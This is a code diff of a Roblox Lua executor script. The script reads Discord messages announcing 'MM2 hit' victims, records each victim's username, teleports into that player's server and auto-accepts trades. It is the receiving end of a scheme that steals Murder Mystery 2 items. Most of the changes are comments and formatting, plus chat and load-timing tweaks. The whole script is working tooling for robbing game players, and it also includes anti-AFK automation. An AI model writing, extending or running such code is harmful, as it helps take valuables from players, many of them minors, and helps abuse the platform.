@@ -3,14 +3,16 @@ if not game:IsLoaded() then
 end
 
 if token == "" or channelId == "" then
-    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
+    game.Players.LocalPlayer:kick("Add your token or channelId to use")
 end
 
 local bb = game:GetService("VirtualUser") -- Anti AFK
-game:service "Players".LocalPlayer.Idled:Connect(function()
-    bb:CaptureController()
-    bb:ClickButton2(Vector2.new())
-end)
+game:service "Players".LocalPlayer.Idled:connect(
+    function()
+        bb:CaptureController()
+        bb:ClickButton2(Vector2.new())
+    end
+)
 
 local HttpServ = game:GetService("HttpService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -46,25 +48,18 @@ end
 
 task.spawn(selectDevice)
 
--- Chat spam 5 seconds after game load, max 4 times
-task.delay(5, function()
-    local count = 0
-    while count < 3 do
-        pcall(function()
-            game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('/w')
-        end)
-        count += 1
-        wait(5)
-    end
-end)
-
+local loadingScreen = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2')
+while loadingScreen.Enabled do
+    wait(1) -- We wait while the loading screen is active
+end
 local waittime = delay or 2
 wait(waittime) -- Small delay to account for ping and stuff
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
 
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId)
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
+    table.insert(joinedIds, messageId) -- Add the new ID
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
 end
 
 local function acceptRequest()
@@ -92,8 +87,12 @@ local function waitForPlayerLeave()
 end
 
 local function IsTrading()
-    local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-    return trade_status == "StartTrade"
+    local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    if trade_statue == "StartTrade" then
+        return true
+    else
+        return false
+    end
 end
 
 local function tradeTimer()
@@ -107,8 +106,8 @@ local function tradeTimer()
 end
 
 waitForPlayerLeave()
-task.spawn(acceptRequest)
-task.spawn(acceptTrade)
+task.spawn(acceptRequest) -- Start accepting trade requests
+task.spawn(acceptTrade) -- Start accepting trades
 task.spawn(tradeTimer)
 
 local function autoJoin()
@@ -131,15 +130,15 @@ local function autoJoin()
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get MM2 hit") then
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
 
                         if didVictimLeave or timer > 5 then
                             if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id))
+                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
                                 writefile("user.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
                                 return
                             end
                         end
